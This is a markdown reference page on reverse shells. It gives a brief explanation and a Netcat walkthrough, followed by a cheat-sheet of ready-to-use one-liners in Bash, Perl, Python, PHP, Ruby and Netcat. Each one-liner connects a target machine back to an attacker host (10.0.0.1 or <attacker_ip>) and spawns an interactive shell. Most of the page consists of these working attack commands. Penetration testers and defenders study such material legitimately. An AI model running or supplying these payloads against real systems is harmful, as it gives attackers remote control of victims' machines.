# Reverse Shell

### Explanation
A reverse shell is a type of shell session initiated by a remote attacker to gain control of a target system. In a typical client-server model, the client connects to the server to request services or resources. However, in the case of a reverse shell, the roles are reversed: the target system (the server) connects back to the attacker's system (the client) to establish a shell session.

#### Example

##### Attacker's System Setup
First, ***the attacker*** sets up a listener using Netcat on a specific port. This listener will wait for connections from the target system.

```nc -lvp 4444```

- **l**: Listen mode, for incoming connections.
- **v**: Verbose mode, to display detailed information.
- **p 4444**: Specifies the port number to listen on (in this example, port 4444).  

##### Target System Execution

On the ***target system***, the attacker somehow delivers and executes a payload (for example, a shell script or executable) that connects back to the attacker's system. This payload could be delivered through various means, such as exploiting vulnerabilities, social engineering, or other methods.

Assuming the target system has Netcat installed, the attacker can execute the following command on the target system to establish a reverse shell connection:

```nc <attacker_ip> 4444 -e /bin/bash```  

- **<attacker_ip>**: Replace this with the IP address of the attacker's system.
- **-e /bin/bash**: Specifies that the shell (/bin/bash) should be executed upon connection.

##### Shell Session

Once the payload is executed on the target system, it initiates a connection back to the attacker's system. The attacker's Netcat listener then receives this connection and provides a shell session, allowing the attacker to execute commands on the target system.

```
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [target_ip] 12345 received!
$ 
```

### Cheat-Sheet

##### Bash shell

1: ```nc -lvp 1234```
2: ```bash -i >& /dev/tcp/10.0.0.1/1234 0>&1```  

##### Perl shell

1: ```nc -lvp 1234```
2: ```perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```  

##### Python shell

1: ```nc -lvp 1234```
2: ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``` 

##### PHP shell

1: ```nc -lvp 1234```
2: ```php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'``` 

##### Ruby shell

1: ```nc -lvp 1234```
2: ```ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'``` 

##### Netcat shell

1: ```nc -lvp 1234```
2: ```nc -e /bin/sh 10.0.0.1 1234``` 

